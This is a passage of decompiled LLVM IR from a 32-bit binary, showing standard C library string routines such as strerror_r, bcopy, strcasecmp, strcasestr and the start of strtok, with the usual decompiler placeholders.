dec_label_pc_8051e27.preheader:                   ; preds = %dec_label_pc_8051e09, %dec_label_pc_8051e34
  %v0_8051e12.ph.in = phi i8 [ %v4_8051dfe.sink.in, %dec_label_pc_8051e34 ], [ %v3_8051e09, %dec_label_pc_8051e09 ]
  %v14_8051e2745 = icmp eq i8 %v0_8051e12.ph.in, %v2_8051dcb
  %v1_8051e2a47 = icmp eq i1 %v14_8051e2745, false
  br i1 %v1_8051e2a47, label %dec_label_pc_8051e12, label %dec_label_pc_8051e2c

dec_label_pc_8051e12:                             ; preds = %dec_label_pc_8051e27.preheader, %dec_label_pc_8051e23
  %v0_8051e1249.in = phi i8 [ %v2_8051e24, %dec_label_pc_8051e23 ], [ %v0_8051e12.ph.in, %dec_label_pc_8051e27.preheader ]
  %v0_8051e1648 = phi i32 [ %v1_8051e23, %dec_label_pc_8051e23 ], [ %v0_8051e3a, %dec_label_pc_8051e27.preheader ]
  %v1_8051e12 = icmp eq i8 %v0_8051e1249.in, 0
  br i1 %v1_8051e12, label %dec_label_pc_8051e80, label %dec_label_pc_8051e16

dec_label_pc_8051e16:                             ; preds = %dec_label_pc_8051e12
  %v1_8051e16 = add i32 %v0_8051e1648, 1
  %v1_8051e17 = inttoptr i32 %v1_8051e16 to i8*
  %v2_8051e17 = load i8, i8* %v1_8051e17, align 1
  %v14_8051e1a = icmp eq i8 %v2_8051e17, %v2_8051dcb
  br i1 %v14_8051e1a, label %dec_label_pc_8051e2c, label %dec_label_pc_8051e1f

dec_label_pc_8051e1f:                             ; preds = %dec_label_pc_8051e16
  %v1_8051e1f = icmp eq i8 %v2_8051e17, 0
  br i1 %v1_8051e1f, label %dec_label_pc_8051e80, label %dec_label_pc_8051e23

dec_label_pc_8051e23:                             ; preds = %dec_label_pc_8051e1f
  %v1_8051e23 = add i32 %v0_8051e1648, 2
  %v1_8051e24 = inttoptr i32 %v1_8051e23 to i8*
  %v2_8051e24 = load i8, i8* %v1_8051e24, align 1
  %v14_8051e27 = icmp eq i8 %v2_8051e24, %v2_8051dcb
  %v1_8051e2a = icmp eq i1 %v14_8051e27, false
  br i1 %v1_8051e2a, label %dec_label_pc_8051e12, label %dec_label_pc_8051e2c

dec_label_pc_8051e2c:                             ; preds = %dec_label_pc_8051e23, %dec_label_pc_8051e16, %dec_label_pc_8051e27.preheader
  %v0_8051e2c = phi i32 [ %v0_8051e3a, %dec_label_pc_8051e27.preheader ], [ %v1_8051e16, %dec_label_pc_8051e16 ], [ %v1_8051e23, %dec_label_pc_8051e23 ]
  %v1_8051e2c = add i32 %v0_8051e2c, 1
  br label %dec_label_pc_8051e34

dec_label_pc_8051e34:                             ; preds = %dec_label_pc_8051dfe, %dec_label_pc_8051e2c
  %v0_8051e3a = phi i32 [ %v1_8051dfe, %dec_label_pc_8051dfe ], [ %v1_8051e2c, %dec_label_pc_8051e2c ]
  %v4_8051dfe.sink.in.in.in = phi i32 [ %v1_8051dfe, %dec_label_pc_8051dfe ], [ %v1_8051e2c, %dec_label_pc_8051e2c ]
  %v4_8051dfe.sink.in.in = inttoptr i32 %v4_8051dfe.sink.in.in.in to i8*
  %v4_8051dfe.sink.in = load i8, i8* %v4_8051dfe.sink.in.in, align 1
  %storemerge4 = icmp eq i8 %v4_8051dfe.sink.in, %v3_8051df2
  %v1_8051e34 = icmp eq i1 %storemerge4, false
  br i1 %v1_8051e34, label %dec_label_pc_8051e27.preheader, label %dec_label_pc_8051e36

dec_label_pc_8051e36:                             ; preds = %dec_label_pc_8051e34
  %v1_8051e3a = add i32 %v0_8051e3a, 1
  %v1_8051e41 = add i32 %v0_8051e3a, -1
  %v2_8051e44 = inttoptr i32 %v1_8051e3a to i8*
  %v3_8051e44 = load i8, i8* %v2_8051e44, align 1
  %v4_8051e44 = zext i8 %v3_8051e44 to i32
  %v3_8051e48 = load i8, i8* %v2_8051e48, align 1
  %v4_8051e48 = zext i8 %v3_8051e48 to i32
  %v12_8051e4d = icmp eq i8 %v3_8051e44, %v3_8051e48
  %v1_8051e4f = icmp eq i1 %v12_8051e4d, false
  br i1 %v1_8051e4f, label %dec_label_pc_8051e78, label %dec_label_pc_8051e51

dec_label_pc_8051e51:                             ; preds = %dec_label_pc_8051e36, %dec_label_pc_8051e65
  %v0_8051e68 = phi i32 [ %v1_8051e68, %dec_label_pc_8051e65 ], [ %v1_8051e48, %dec_label_pc_8051e36 ]
  %v0_8051e65 = phi i32 [ %v1_8051e65, %dec_label_pc_8051e65 ], [ %v1_8051e3a, %dec_label_pc_8051e36 ]
  %v0_8051e51 = phi i32 [ %v3_8051e6b, %dec_label_pc_8051e65 ], [ %v4_8051e44, %dec_label_pc_8051e36 ]
  %v1_8051e51 = icmp eq i32 %v0_8051e51, 0
  br i1 %v1_8051e51, label %dec_label_pc_8051e82, label %dec_label_pc_8051e55

dec_label_pc_8051e55:                             ; preds = %dec_label_pc_8051e51
  %v1_8051e55 = add i32 %v0_8051e65, 1
  %v2_8051e55 = inttoptr i32 %v1_8051e55 to i8*
  %v3_8051e55 = load i8, i8* %v2_8051e55, align 1
  %v1_8051e59 = add i32 %v0_8051e68, 1
  %v2_8051e59 = inttoptr i32 %v1_8051e59 to i8*
  %v3_8051e59 = load i8, i8* %v2_8051e59, align 1
  %v4_8051e59 = zext i8 %v3_8051e59 to i32
  %v12_8051e5d = icmp eq i8 %v3_8051e55, %v3_8051e59
  %v1_8051e5f = icmp eq i1 %v12_8051e5d, false
  br i1 %v1_8051e5f, label %dec_label_pc_8051e78, label %dec_label_pc_8051e61

dec_label_pc_8051e61:                             ; preds = %dec_label_pc_8051e55
  %v1_8051e61 = icmp eq i8 %v3_8051e59, 0
  br i1 %v1_8051e61, label %dec_label_pc_8051e82, label %dec_label_pc_8051e65

dec_label_pc_8051e65:                             ; preds = %dec_label_pc_8051e61
  %v1_8051e65 = add i32 %v0_8051e65, 2
  %v1_8051e68 = add i32 %v0_8051e68, 2
  %v1_8051e6b = inttoptr i32 %v1_8051e68 to i8*
  %v2_8051e6b = load i8, i8* %v1_8051e6b, align 1
  %v3_8051e6b = zext i8 %v2_8051e6b to i32
  %v1_8051e6f = inttoptr i32 %v1_8051e65 to i8*
  %v2_8051e6f = load i8, i8* %v1_8051e6f, align 1
  %v12_8051e72 = icmp eq i8 %v2_8051e6f, %v2_8051e6b
  br i1 %v12_8051e72, label %dec_label_pc_8051e51, label %dec_label_pc_8051e76

dec_label_pc_8051e76:                             ; preds = %dec_label_pc_8051e65
  br label %dec_label_pc_8051e78

dec_label_pc_8051e78:                             ; preds = %dec_label_pc_8051e55, %dec_label_pc_8051e36, %dec_label_pc_8051e76
  %v0_8051e78 = phi i32 [ %v4_8051e48, %dec_label_pc_8051e36 ], [ %v3_8051e6b, %dec_label_pc_8051e76 ], [ %v4_8051e59, %dec_label_pc_8051e55 ]
  %v1_8051e78 = icmp eq i32 %v0_8051e78, 0
  %v1_8051e7a = icmp eq i1 %v1_8051e78, false
  br i1 %v1_8051e7a, label %dec_label_pc_8051e09, label %dec_label_pc_8051e82

dec_label_pc_8051e80:                             ; preds = %dec_label_pc_8051dda, %dec_label_pc_8051e1f, %dec_label_pc_8051e12
  br label %dec_label_pc_8051e82

dec_label_pc_8051e82:                             ; preds = %dec_label_pc_8051e78, %dec_label_pc_8051e51, %dec_label_pc_8051e61, %entry, %dec_label_pc_8051deb, %dec_label_pc_8051e80
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8051e80 ], [ %v1_8051dda, %dec_label_pc_8051deb ], [ %arg1, %entry ], [ %v1_8051e41, %dec_label_pc_8051e61 ], [ %v1_8051e41, %dec_label_pc_8051e51 ], [ %v1_8051e41, %dec_label_pc_8051e78 ]
  store i32 %v0_8051dbf, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_8051e68, { 1, 0 }
  uselistorder i32 %v1_8051e65, { 1, 0 }
  uselistorder i8 %v3_8051e59, { 1, 0, 2 }
  uselistorder i8 %v4_8051dfe.sink.in, { 1, 0 }
  uselistorder i32 %v0_8051e3a, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v2_8051e24, { 1, 0 }
  uselistorder i32 %v1_8051e23, { 0, 2, 1 }
  uselistorder i8 %v2_8051e17, { 1, 0 }
  uselistorder i32 %v0_8051e1648, { 1, 0 }
  uselistorder i32 %v1_8051dda, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051e82, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8051e80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051e78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051e51, { 1, 0 }
  uselistorder label %dec_label_pc_8051e34, { 1, 0 }
  uselistorder label %dec_label_pc_8051e12, { 1, 0 }
  uselistorder label %dec_label_pc_8051e27.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_8051e9d = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8051ea5 = load i32, i32* @ebx, align 4
  ret i32 %v0_8051ea5
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_8051ebe = icmp ugt i32 %arg1, 124
  br i1 %v6_8051ebe, label %dec_label_pc_8051edb, label %dec_label_pc_8051ec0

dec_label_pc_8051ec0:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8060560.718 to i32), i32* @esi, align 4
  %v1_8051ed04 = icmp eq i32 %arg1, 0
  %v1_8051ed211 = icmp eq i1 %v1_8051ed04, false
  br i1 %v1_8051ed211, label %dec_label_pc_8051ec9, label %dec_label_pc_8051ed4

dec_label_pc_8051ec9:                             ; preds = %dec_label_pc_8051ec0, %dec_label_pc_8051ec9
  %v0_8051ecc = phi i32 [ %v3_8051ecc, %dec_label_pc_8051ec9 ], [ %arg1, %dec_label_pc_8051ec0 ]
  %v0_8051ecf = phi i32 [ %v1_8051ecf, %dec_label_pc_8051ec9 ], [ ptrtoint ([8 x i8]* @global_var_8060560.718 to i32), %dec_label_pc_8051ec0 ]
  %v1_8051ec9 = inttoptr i32 %v0_8051ecf to i8*
  %v2_8051ec9 = load i8, i8* %v1_8051ec9, align 1
  %v7_8051ec9 = icmp eq i8 %v2_8051ec9, 0
  %v2_8051ecc = zext i1 %v7_8051ec9 to i32
  %v3_8051ecc = add i32 %v2_8051ecc, %v0_8051ecc
  %v16_8051ecc = icmp eq i32 %v3_8051ecc, 0
  %v1_8051ecf = add i32 %v0_8051ecf, 1
  store i32 %v1_8051ecf, i32* @esi, align 4
  %v1_8051ed2 = icmp eq i1 %v16_8051ecc, false
  br i1 %v1_8051ed2, label %dec_label_pc_8051ec9, label %dec_label_pc_8051ed4

dec_label_pc_8051ed4:                             ; preds = %dec_label_pc_8051ec9, %dec_label_pc_8051ec0
  %v0_8051ed6 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8060560.718 to i32), %dec_label_pc_8051ec0 ], [ %v1_8051ecf, %dec_label_pc_8051ec9 ]
  store i32 0, i32* @ebp, align 4
  %v1_8051ed6 = inttoptr i32 %v0_8051ed6 to i8*
  %v2_8051ed6 = load i8, i8* %v1_8051ed6, align 1
  %v3_8051ed6 = icmp eq i8 %v2_8051ed6, 0
  %v1_8051ed9 = icmp eq i1 %v3_8051ed6, false
  br i1 %v1_8051ed9, label %dec_label_pc_8051ed4.dec_label_pc_8051f0a_crit_edge, label %dec_label_pc_8051edb

dec_label_pc_8051ed4.dec_label_pc_8051f0a_crit_edge: ; preds = %dec_label_pc_8051ed4
  br label %dec_label_pc_8051f0a

dec_label_pc_8051edb:                             ; preds = %dec_label_pc_8051ed4, %entry
  %v1_8051ede = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_8051eef = bitcast i32* %stack_var_-17 to i8*
  %v7_8051eef = call i32 @_uintmaxtostr(i8* %v6_8051eef, i32 %arg1, i32 %v1_8051ede, i32 -10, i32 0)
  %v1_8051efe = add i32 %v7_8051eef, -14
  store i32 %v1_8051efe, i32* @esi, align 4
  %v5_8051f01 = inttoptr i32 %v1_8051efe to i8*
  store i8* %v5_8051f01, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_8051efe to i16*
  %v6_8051f02 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8060536.719 to i32), i32 14)
  %v1_8051f14.pre = load i32, i32* @edi, align 4
  %v0_8051f1a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051f0a

dec_label_pc_8051f0a:                             ; preds = %dec_label_pc_8051ed4.dec_label_pc_8051f0a_crit_edge, %dec_label_pc_8051edb
  %v0_8051f1a = phi i32 [ %v0_8051ed6, %dec_label_pc_8051ed4.dec_label_pc_8051f0a_crit_edge ], [ %v0_8051f1a.pre, %dec_label_pc_8051edb ]
  %v1_8051f14 = phi i32 [ %arg3, %dec_label_pc_8051ed4.dec_label_pc_8051f0a_crit_edge ], [ %v1_8051f14.pre, %dec_label_pc_8051edb ]
  %v4_8051f0a = icmp eq i32 %arg2, 0
  %v3_8051f14 = select i1 %v4_8051f0a, i32 0, i32 %v1_8051f14
  store i32 %v3_8051f14, i32* @edi, align 4
  %v5_8051f1a = inttoptr i32 %v0_8051f1a to i8*
  store i8* %v5_8051f1a, i8** %stack_var_-108, align 4
  %v3_8051f1b = call i32 @strlen(i8* %v5_8051f1a)
  %v1_8051f23 = add i32 %v3_8051f1b, 1
  store i32 %v1_8051f23, i32* %ebx.global-to-local, align 4
  %v1_8051f26 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_8051f23, %v1_8051f26
  br i1 %tmp, label %dec_label_pc_8051f2a, label %dec_label_pc_8051f31

dec_label_pc_8051f2a:                             ; preds = %dec_label_pc_8051f0a
  store i32 %v1_8051f26, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_8051f31

dec_label_pc_8051f31:                             ; preds = %dec_label_pc_8051f0a, %dec_label_pc_8051f2a
  %v0_8051f36 = phi i32 [ %v1_8051f23, %dec_label_pc_8051f0a ], [ %v1_8051f26, %dec_label_pc_8051f2a ]
  %v1_8051f31 = icmp eq i32 %v0_8051f36, 0
  br i1 %v1_8051f31, label %dec_label_pc_8051f4d, label %dec_label_pc_8051f35

dec_label_pc_8051f35:                             ; preds = %dec_label_pc_8051f31
  %v0_8051f37 = load i32, i32* @esi, align 4
  %v8_8051f38 = inttoptr i32 %arg2 to i8*
  store i8* %v8_8051f38, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_8051f3c = call i32 @memcpy(i16* %tmp45, i32 %v0_8051f37, i32 %v0_8051f36)
  %v1_8051f48 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051f48 = add i32 %arg2, -1
  %v3_8051f48 = add i32 %v2_8051f48, %v1_8051f48
  %v4_8051f48 = inttoptr i32 %v3_8051f48 to i8*
  store i8 0, i8* %v4_8051f48, align 1
  br label %dec_label_pc_8051f4d

dec_label_pc_8051f4d:                             ; preds = %dec_label_pc_8051f31, %dec_label_pc_8051f35
  %v0_8051f4d = load i32, i32* @ebp, align 4
  %v1_8051f4d = icmp eq i32 %v0_8051f4d, 0
  br i1 %v1_8051f4d, label %dec_label_pc_8051f58, label %dec_label_pc_8051f51

dec_label_pc_8051f51:                             ; preds = %dec_label_pc_8051f4d
  %v0_8051f51 = load i8*, i8** %stack_var_-108, align 4
  %v1_8051f51 = ptrtoint i8* %v0_8051f51 to i32
  %v2_8051f51 = call i32 @__errno_location(i32 %v1_8051f51)
  %v0_8051f56 = load i32, i32* @ebp, align 4
  %v2_8051f56 = inttoptr i32 %v2_8051f51 to i32*
  store i32 %v0_8051f56, i32* %v2_8051f56, align 4
  %v0_8051f5b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051f58

dec_label_pc_8051f58:                             ; preds = %dec_label_pc_8051f4d, %dec_label_pc_8051f51
  %v0_8051f5b = phi i32 [ 0, %dec_label_pc_8051f4d ], [ %v0_8051f5b.pre, %dec_label_pc_8051f51 ]
  ret i32 %v0_8051f5b

; uselistorder directives
  uselistorder i32 %v1_8051f26, { 1, 2, 0 }
  uselistorder i32 %v1_8051f23, { 1, 0, 2 }
  uselistorder i32 %v1_8051ecf, { 0, 2, 1 }
  uselistorder i32 %v3_8051ecc, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8060560.718 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8051f58, { 1, 0 }
  uselistorder label %dec_label_pc_8051f4d, { 1, 0 }
  uselistorder label %dec_label_pc_8051f31, { 1, 0 }
  uselistorder label %dec_label_pc_8051f0a, { 1, 0 }
  uselistorder label %dec_label_pc_8051ec9, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8051f74 = inttoptr i32 %arg2 to i8*
  %v3_8051f74 = call i32 @memmove(i8* %v2_8051f74, i32 %arg1)
  ret i32 %v3_8051f74
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8051f7d = load i32, i32* bitcast (i32** @global_var_8062540.721 to i32*), align 64
  %v4_8051f86 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8051f8e

dec_label_pc_8051f8e:                             ; preds = %dec_label_pc_8051fab, %entry
  %storemerge = phi i32 [ %v4_8051f86, %entry ], [ %v1_8051fac, %dec_label_pc_8051fab ]
  %v0_8051fac = phi i32 [ %v4_8051f86, %entry ], [ %v1_8051fac, %dec_label_pc_8051fab ]
  %v0_8051fb16 = phi i32 [ 0, %entry ], [ %v0_8051fb17, %dec_label_pc_8051fab ]
  %v0_8051fab = phi i32 [ %arg2, %entry ], [ %v1_8051fab, %dec_label_pc_8051fab ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_8051f8e = icmp eq i32 %v0_8051fac, %v0_8051fab
  %.pre = inttoptr i32 %v0_8051fac to i8*
  br i1 %v12_8051f8e, label %dec_label_pc_8051fa6, label %dec_label_pc_8051f92

dec_label_pc_8051f92:                             ; preds = %dec_label_pc_8051f8e
  %v2_8051f92 = load i8, i8* %.pre, align 1
  %v3_8051f92 = zext i8 %v2_8051f92 to i32
  %v2_8051f95 = mul nuw nsw i32 %v3_8051f92, 2
  %v3_8051f95 = add i32 %v2_8051f95, %v0_8051f7d
  %v4_8051f95 = inttoptr i32 %v3_8051f95 to i16*
  %v5_8051f95 = load i16, i16* %v4_8051f95, align 2
  %v6_8051f95 = sext i16 %v5_8051f95 to i32
  %v1_8051f99 = inttoptr i32 %v0_8051fab to i8*
  %v2_8051f99 = load i8, i8* %v1_8051f99, align 1
  %v3_8051f99 = zext i8 %v2_8051f99 to i32
  %v2_8051f9c = mul nuw nsw i32 %v3_8051f99, 2
  %v3_8051f9c = add i32 %v2_8051f9c, %v0_8051f7d
  %v4_8051f9c = inttoptr i32 %v3_8051f9c to i16*
  %v5_8051f9c = load i16, i16* %v4_8051f9c, align 2
  %v6_8051f9c = sext i16 %v5_8051f9c to i32
  %v2_8051fa0 = sub nsw i32 %v6_8051f95, %v6_8051f9c
  %v12_8051fa0 = icmp eq i32 %v2_8051fa0, 0
  store i32 %v2_8051fa0, i32* @edx, align 4
  %v1_8051fa4 = icmp eq i1 %v12_8051fa0, false
  br i1 %v1_8051fa4, label %dec_label_pc_8051faf, label %dec_label_pc_8051fa6

dec_label_pc_8051fa6:                             ; preds = %dec_label_pc_8051f8e, %dec_label_pc_8051f92
  %v0_8051fb17 = phi i32 [ %v2_8051fa0, %dec_label_pc_8051f92 ], [ %v0_8051fb16, %dec_label_pc_8051f8e ]
  %v2_8051fa6 = load i8, i8* %.pre, align 1
  %v3_8051fa6 = icmp eq i8 %v2_8051fa6, 0
  br i1 %v3_8051fa6, label %dec_label_pc_8051faf, label %dec_label_pc_8051fab

dec_label_pc_8051fab:                             ; preds = %dec_label_pc_8051fa6
  %v1_8051fab = add i32 %v0_8051fab, 1
  %v1_8051fac = add i32 %v0_8051fac, 1
  br label %dec_label_pc_8051f8e

dec_label_pc_8051faf:                             ; preds = %dec_label_pc_8051fa6, %dec_label_pc_8051f92
  %v0_8051fb1 = phi i32 [ %v0_8051fb17, %dec_label_pc_8051fa6 ], [ %v2_8051fa0, %dec_label_pc_8051f92 ]
  ret i32 %v0_8051fb1

; uselistorder directives
  uselistorder i32 %v1_8051fac, { 1, 0 }
  uselistorder i32 %v0_8051fb17, { 1, 0 }
  uselistorder i32 %v2_8051fa0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8051fab, { 1, 2, 0 }
  uselistorder i32 %v0_8051fac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051fa6, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8051fb7 = load i32, i32* @ebx, align 4
  %v4_8051fbb = ptrtoint i8* %arg1 to i32
  %v1_8051fc718 = inttoptr i32 %arg2 to i8*
  %v2_8051fc71932 = load i8, i8* %v1_8051fc718, align 1
  %v4_8051fc92336 = icmp eq i8 %v2_8051fc71932, 0
  %v1_8051fcb2538 = icmp eq i1 %v4_8051fc92336, false
  br i1 %v1_8051fcb2538, label %dec_label_pc_8051fd1.lr.ph.lr.ph, label %dec_label_pc_8052001

dec_label_pc_8051fd1.lr.ph.lr.ph:                 ; preds = %entry
  %v3_8051fc72033 = zext i8 %v2_8051fc71932 to i32
  %v4_8051fc7.pre.pre = load i32, i32* @eax, align 4
  %v5_8051fc72134 = and i32 %v4_8051fc7.pre.pre, -256
  %v6_8051fc72235 = or i32 %v3_8051fc72033, %v5_8051fc72134
  %v4_8051fd1.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051fd1.lr.ph

dec_label_pc_8051fd1.lr.ph:                       ; preds = %dec_label_pc_8051fd1.lr.ph.lr.ph, %dec_label_pc_8051ffc
  %v4_8051fd1.pre = phi i32 [ %v4_8051fd1.pre.pre, %dec_label_pc_8051fd1.lr.ph.lr.ph ], [ %v0_8051fdb, %dec_label_pc_8051ffc ]
  %v6_8051fc72241 = phi i32 [ %v6_8051fc72235, %dec_label_pc_8051fd1.lr.ph.lr.ph ], [ %v6_8051fc722, %dec_label_pc_8051ffc ]
  %v2_8051fc71940 = phi i8 [ %v2_8051fc71932, %dec_label_pc_8051fd1.lr.ph.lr.ph ], [ %v2_8051fc719, %dec_label_pc_8051ffc ]
  %v0_8051ffc39 = phi i32 [ %v4_8051fbb, %dec_label_pc_8051fd1.lr.ph.lr.ph ], [ %v1_8051ffc, %dec_label_pc_8051ffc ]
  br label %dec_label_pc_8051fd1

dec_label_pc_8051fd1:                             ; preds = %dec_label_pc_8051fd1.lr.ph, %dec_label_pc_8051ff1
  %v4_8051fd1 = phi i32 [ %v4_8051fd1.pre, %dec_label_pc_8051fd1.lr.ph ], [ %v4_8051fd146, %dec_label_pc_8051ff1 ]
  %v6_8051fc730 = phi i32 [ %v6_8051fc72241, %dec_label_pc_8051fd1.lr.ph ], [ %v6_8051fc7, %dec_label_pc_8051ff1 ]
  %v2_8051fc729 = phi i8 [ %v2_8051fc71940, %dec_label_pc_8051fd1.lr.ph ], [ %v2_8051fc7, %dec_label_pc_8051ff1 ]
  %v1_8051fc728 = phi i8* [ %v1_8051fc718, %dec_label_pc_8051fd1.lr.ph ], [ %v1_8051fc7, %dec_label_pc_8051ff1 ]
  %v0_8051ff127 = phi i32 [ %arg2, %dec_label_pc_8051fd1.lr.ph ], [ %v1_8051ff1, %dec_label_pc_8051ff1 ]
  %v0_8051ff226 = phi i32 [ %v0_8051ffc39, %dec_label_pc_8051fd1.lr.ph ], [ %v1_8051ff2, %dec_label_pc_8051ff1 ]
  %v1_8051fd1 = inttoptr i32 %v0_8051ff226 to i8*
  %v2_8051fd1 = load i8, i8* %v1_8051fd1, align 1
  %v3_8051fd1 = zext i8 %v2_8051fd1 to i32
  %v5_8051fd1 = and i32 %v4_8051fd1, -256
  %v6_8051fd1 = or i32 %v5_8051fd1, %v3_8051fd1
  %v15_8051fd3 = icmp eq i8 %v2_8051fc729, %v2_8051fd1
  br i1 %v15_8051fd3, label %dec_label_pc_8051ff1, label %dec_label_pc_8051fdb

dec_label_pc_8051fdb:                             ; preds = %dec_label_pc_8051fd1
  %v0_8051fdb = load i32, i32* bitcast (i32** @global_var_8062540.721 to i32*), align 64
  %v2_8051fe1 = load i8, i8* %v1_8051fd1, align 1
  %v3_8051fe1 = zext i8 %v2_8051fe1 to i32
  %v2_8051fe4 = load i8, i8* %v1_8051fc728, align 1
  %v3_8051fe4 = zext i8 %v2_8051fe4 to i32
  %v2_8051fe7 = mul nuw nsw i32 %v3_8051fe1, 2
  %v3_8051fe7 = add i32 %v2_8051fe7, %v0_8051fdb
  %v4_8051fe7 = inttoptr i32 %v3_8051fe7 to i16*
  %v5_8051fe7 = load i16, i16* %v4_8051fe7, align 2
  %v6_8051fe7 = zext i16 %v5_8051fe7 to i32
  %v4_8051feb = mul nuw nsw i32 %v3_8051fe4, 2
  %v5_8051feb = add i32 %v4_8051feb, %v0_8051fdb
  %v6_8051feb = inttoptr i32 %v5_8051feb to i16*
  %v7_8051feb = load i16, i16* %v6_8051feb, align 2
  %v18_8051feb = icmp eq i16 %v5_8051fe7, %v7_8051feb
  %v1_8051fef = icmp eq i1 %v18_8051feb, false
  br i1 %v1_8051fef, label %dec_label_pc_8051ff5, label %dec_label_pc_8051ff1

dec_label_pc_8051ff1:                             ; preds = %dec_label_pc_8051fdb, %dec_label_pc_8051fd1
  %v4_8051fd146 = phi i32 [ %v0_8051fdb, %dec_label_pc_8051fdb ], [ %v6_8051fd1, %dec_label_pc_8051fd1 ]
  %v4_8051fc76 = phi i32 [ %v6_8051fe7, %dec_label_pc_8051fdb ], [ %v6_8051fc730, %dec_label_pc_8051fd1 ]
  %v1_8051ff1 = add i32 %v0_8051ff127, 1
  %v1_8051ff2 = add i32 %v0_8051ff226, 1
  %v1_8051fc7 = inttoptr i32 %v1_8051ff1 to i8*
  %v2_8051fc7 = load i8, i8* %v1_8051fc7, align 1
  %v3_8051fc7 = zext i8 %v2_8051fc7 to i32
  %v5_8051fc7 = and i32 %v4_8051fc76, -256
  %v6_8051fc7 = or i32 %v3_8051fc7, %v5_8051fc7
  %v4_8051fc9 = icmp eq i8 %v2_8051fc7, 0
  %v1_8051fcb = icmp eq i1 %v4_8051fc9, false
  br i1 %v1_8051fcb, label %dec_label_pc_8051fd1, label %dec_label_pc_8052001

dec_label_pc_8051ff5:                             ; preds = %dec_label_pc_8051fdb
  %v4_8051ff5 = icmp eq i8 %v2_8051fd1, 0
  br i1 %v4_8051ff5, label %dec_label_pc_8051fff, label %dec_label_pc_8051ffc

dec_label_pc_8051ffc:                             ; preds = %dec_label_pc_8051ff5
  %v1_8051ffc = add i32 %v0_8051ffc39, 1
  %v2_8051fc719 = load i8, i8* %v1_8051fc718, align 1
  %v3_8051fc720 = zext i8 %v2_8051fc719 to i32
  %v5_8051fc721 = and i32 %v6_8051fe7, 65280
  %v6_8051fc722 = or i32 %v3_8051fc720, %v5_8051fc721
  %v4_8051fc923 = icmp eq i8 %v2_8051fc719, 0
  %v1_8051fcb25 = icmp eq i1 %v4_8051fc923, false
  br i1 %v1_8051fcb25, label %dec_label_pc_8051fd1.lr.ph, label %dec_label_pc_8052001

dec_label_pc_8051fff:                             ; preds = %dec_label_pc_8051ff5
  br label %dec_label_pc_8052001

dec_label_pc_8052001:                             ; preds = %dec_label_pc_8051ffc, %entry, %dec_label_pc_8051ff1, %dec_label_pc_8051fff
  %storemerge = phi i32 [ 0, %dec_label_pc_8051fff ], [ %v4_8051fbb, %entry ], [ %v1_8051ffc, %dec_label_pc_8051ffc ], [ %v0_8051ffc39, %dec_label_pc_8051ff1 ]
  store i32 %v0_8051fb7, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8051fc719, { 1, 2, 0 }
  uselistorder i8 %v2_8051fc7, { 1, 2, 0 }
  uselistorder i8* %v1_8051fc7, { 1, 0 }
  uselistorder i32 %v0_8051fdb, { 1, 2, 3, 0 }
  uselistorder i8 %v2_8051fd1, { 1, 0, 2 }
  uselistorder i32 %v0_8051ff226, { 1, 0 }
  uselistorder i8 %v2_8051fc71932, { 0, 2, 1 }
  uselistorder i8* %v1_8051fc718, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052001, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8051fd1, { 1, 0 }
  uselistorder label %dec_label_pc_8051fd1.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8052018 = inttoptr i32 %arg1 to i8*
